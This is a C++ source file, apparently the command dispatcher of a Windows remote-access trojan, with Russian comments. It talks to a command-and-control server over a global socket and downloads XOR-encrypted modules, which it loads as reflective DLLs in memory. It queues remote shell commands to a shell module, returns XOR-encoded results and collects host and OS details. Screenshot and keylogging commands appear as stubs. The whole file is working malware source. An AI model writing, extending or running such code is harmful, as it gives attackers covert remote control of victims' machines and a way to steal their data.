// Core/commands.cpp — WITH MODULE COMMAND ROUTING
#include "commands.h"
#include "loader.h"
#include "network.h"
#include <windows.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <queue>
#include <map>

// Глобальный сокет (объявлен в network.cpp)
extern SOCKET g_c2_socket;

// ==========================================
// MODULE COMMAND QUEUE (simple routing)
// ==========================================
static CRITICAL_SECTION g_module_cmd_cs;
static std::map<std::string, std::queue<std::string>> g_module_commands;

static void init_module_commands() {
    InitializeCriticalSection(&g_module_cmd_cs);
}

static void push_module_command(const std::string& module, const std::string& cmd) {
    EnterCriticalSection(&g_module_cmd_cs);
    g_module_commands[module].push(cmd);
    LeaveCriticalSection(&g_module_cmd_cs);
}

// Callback для модулей: получить команду (если есть)
static const char* module_get_command(const char* module_name) {
    static char result[1024] = {0};
    EnterCriticalSection(&g_module_cmd_cs);
    
    auto it = g_module_commands.find(module_name);
    if (it != g_module_commands.end() && !it->second.empty()) {
        std::string cmd = it->second.front();
        it->second.pop();
        strncpy_s(result, cmd.c_str(), sizeof(result) - 1);
        LeaveCriticalSection(&g_module_cmd_cs);
        return result;
    }
    
    LeaveCriticalSection(&g_module_cmd_cs);
    return ""; // Нет команд
}
// ==========================================


// ==========================================
// 1. CALLBACKS (ОПРЕДЕЛЕНЫ ДО ИСПОЛЬЗОВАНИЯ)
// ==========================================
static void module_log(const char* msg) {
    OutputDebugStringA("[MODULE] ");
    OutputDebugStringA(msg);
    OutputDebugStringA("\n");
}

static void module_send_result(const uint8_t* data, size_t len) {
    if (g_c2_socket == INVALID_SOCKET) return;

        // Игнорируем пустые данные или данные, состоящие только из \r\n
    bool only_whitespace = true;
    for (size_t i = 0; i < len; i++) {
        char c = data[i];
        if (c != ' ' && c != '\t' && c != '\r' && c != '\n') {
            only_whitespace = false;
            break;
        }
    }
    if (only_whitespace) return; // Не шлём мусор
    
    // Проверяем, есть ли уже \n в конце
    bool has_newline = (len > 0 && data[len-1] == '\n');
    size_t total_len = has_newline ? len : len + 1;
    
    // Шифруем данные
    std::vector<uint8_t> enc(total_len);
    for (size_t i = 0; i < len; i++) {
        enc[i] = data[i] ^ 0xAA;
    }
    // Добавляем зашифрованный перевод строки, если нужно
    if (!has_newline) {
        enc[len] = '\n' ^ 0xAA;  // 0x0A ^ 0xAA = 0xA0
    }
    
    // === КЛЮЧЕВОЕ ИЗМЕНЕНИЕ ===
    // Отправляем через асинхронную очередь, а не напрямую
    // Это предотвращает гонку с фоновым потоком хартбитов
    push_to_send_queue(enc, 1);
    // ==========================
}
// ==========================================


// Структура для RtlGetVersion
typedef struct _MY_OSVERSIONINFOW {
    ULONG dwOSVersionInfoSize; ULONG dwMajorVersion; ULONG dwMinorVersion; ULONG dwBuildNumber; ULONG dwPlatformId; WCHAR szCSDVersion[128];
} MY_OSVERSIONINFOW;
typedef NTSTATUS (NTAPI* pRtlGetVersion)(MY_OSVERSIONINFOW*);

// ==========================================
// 2. COMMAND DISPATCHER
// ==========================================
std::string execute_builtin_command(const std::string& cmd, SOCKET sock) {
    // Инициализация очередей при первом вызове
    static bool cmds_inited = false;
    if (!cmds_inited) {
        init_module_commands();
        cmds_inited = true;
    }

    if (cmd == "ping") return "pong";
    
    else if (cmd.rfind("LOAD_MODULE ", 0) == 0) {
        std::string module_name = cmd.substr(12);
        
        std::vector<uint8_t> dll_data;
        if (!download_module(module_name, dll_data))
            return "MODULE_DOWNLOAD_FAILED";
        
        xor_decrypt(dll_data);
        
        void* modbase = nullptr;
        if (!load_reflective_dll(dll_data, modbase))
            return "MODULE_LOAD_FAILED";
        
        // Передаём все три коллбэка, включая get_command
        ModuleAPI api = { module_send_result, module_log, module_get_command };
        if (!execute_module(modbase, api))
            return "MODULE_EXECUTION_FAILED";
        
        return "MODULE_LOADED_OK";
    }
    
    // === ROUTING: команды для модулей ===
    else if (cmd.rfind("shell_exec:", 0) == 0) {
        push_module_command("shell", cmd);
        return "SHELL_COMMAND_QUEUED";
    }
    else if (cmd == "shell_stop") {
        push_module_command("shell", "shell_stop");
        return "SHELL_STOP_QUEUED";
    }
    // ======================================
    
    else if (cmd == "info") {
        char host[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD s = sizeof(host);
        if (!GetComputerNameA(host, &s)) strcpy_s(host, "Unknown");
        
        ULONG major = 0, minor = 0, build = 0; 
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            pRtlGetVersion pRtlGetVer = (pRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVer) {
                MY_OSVERSIONINFOW rovi = {0};
                rovi.dwOSVersionInfoSize = sizeof(rovi);
                if (pRtlGetVer(&rovi) == 0) {
                    major = rovi.dwMajorVersion;
                    minor = rovi.dwMinorVersion;
                    build = rovi.dwBuildNumber;
                }
            }
        }
        
        std::string os_name = "Windows";
        if (major == 10 && build >= 22000) os_name = "Windows 11";
        else if (major == 10) os_name = "Windows 10";
        else if (major == 6) os_name = "Windows 7/8";

        char buf[256];
        sprintf_s(buf, "hostname=%s; os=%s Build %d", host, os_name.c_str(), build);
        return std::string(buf);
    } 
    
    else if (cmd == "uninstall") {
        return "UNINSTALLING";
    }
    
    // Заглушки (теперь доступны через модули)
    else if (cmd.find("screenshot") != std::string::npos) return "SCREENSHOT_DISABLED";
    else if (cmd.find("keylog") != std::string::npos) return "KEYLOG_DISABLED";
    
    return "UNKNOWN_COMMAND";
}

// 3. PROCESS COMMAND (обёртка для heartbeat_loop)
// ==========================================
void process_command(const std::string& cmd, SOCKET sock) {
    // Выполняем команду и получаем ответ
    std::string result = execute_builtin_command(cmd, sock);
    
    // Отправляем ответ через асинхронную очередь
    if (!result.empty()) {
        send_encrypted(sock, result + "\n");
    }
}
